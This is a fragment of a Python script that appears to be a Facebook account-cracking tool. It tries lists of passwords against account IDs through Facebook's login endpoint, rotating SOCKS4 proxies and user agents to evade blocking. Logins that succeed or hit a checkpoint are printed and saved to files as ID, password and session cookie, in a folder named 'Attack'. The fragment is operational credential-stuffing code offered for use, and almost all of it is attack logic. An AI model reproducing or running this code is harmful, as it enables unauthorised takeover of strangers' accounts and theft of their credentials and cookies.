	sys.stdout.write(f"\r \033[1;36m[RAVEN]└[{loop}\033[1;33m/\033[1;32m{len(id)}]  \033[1;32m└LIVE ๛  \033[1;30m{ok}  \033[1;32m└CP ๛  \033[1;30m{cp}  {bo}\033[1;36m{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()

	ua = random.choice(ugen)
	ses = requests.Session()

	for pw in pwv:
		while True:
			try:
				nip = random.choice(prox)
				proxs = {'http': 'socks4://' + nip}

				# إعداد الجلسة والهيدر
				ses.headers.update({
					'User-Agent': ua,
					'Content-Type': 'application/x-www-form-urlencoded',
					'Accept': '*/*',
					'Connection': 'keep-alive'
				})

				# payload على طريقة wbloks/fetch
				payload = {
					"__a": "1",
					"__req": "1g",
					"dpr": "3",
					"jazoest": jazoest,
					"lsd": lsd,
					"params": json.dumps({
						"params": json.dumps({
							"server_params": {
								"credential_type": "password",
								"username_text_input_id": "emreph:68",
								"password_text_input_id": "emreph:69",
							},
							"client_input_params": {
								"contact_point": idf,
								"password": f"#PWD_BROWSER:0:{str(int(time.time()))}:{pw}",
								"accounts_list": [],
							},
						})
					})
				}

				headers = {
					'User-Agent': ua,
					'Cookie': "; ".join([f"{k}={v}" for k, v in fb_cookies.items()])
				}

				url = "https://free.prod.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a"
				po = ses.post(url, data=payload, headers=headers, proxies=proxs, timeout=20)

				# التحقق من الكوكي
				kuki = "; ".join([f"{k}={v}" for k, v in ses.cookies.get_dict().items()])
				msg = po.text.encode("utf-8").decode("unicode-escape", errors="ignore")

				if "c_user" in ses.cookies.get_dict().keys():
					ok += 1
					print(f'\r\033[1;92m                     \n\n   🆔 :|     {idf}       🔑 :|     {pw} \n \n\033[0;96m[🌐]= COOKIES└──> \033[38;5;48m{kuki}')
					cek_DYNO(kuki)
					os.system('espeak -a 300 " Rayen Gamoudi ,Facebook ,  Ok,  id  "')
					open('/sdcard/🌐🌐🌐🌐Attack/OK:CP/OK/Rayen.Gamoudi-ok.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n\n')
					break

				elif "accounts_list" in msg:
					cp += 1
					print(f'\r\033[1;92m└──[𝙂𝙖𝙢𝙤𝙪𝙙𝙞-CP] {idf} | {pw} \n  ')
					os.system('espeak -a 300 "  sorry Rayen Gamoudi ,Facebook Cp,  Id  "')
					open('/sdcard/🌐🌐🌐🌐Attack/OK:CP/CP/Rayen.Gamoudi-cp.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n\n')
					akun.append(idf + '|' + pw)
					break

				else:
					break  # جرب كلمة السر التالية

			except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
				print("\n[⚠️] لا يوجد إنترنت أو انتهت المهلة، إعادة المحاولة بعد قليل...")
				time.sleep(9)
				continue  # يعيد المحاولة تلقائياً

	loop += 1
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu() 
# encoding: utf-8
# Decode by Plya_Team-Pro tool...
# Copyright: Plya_Team
# Follow us on telegram ( @Plya_Team ) 
# Layers --> code 1bc
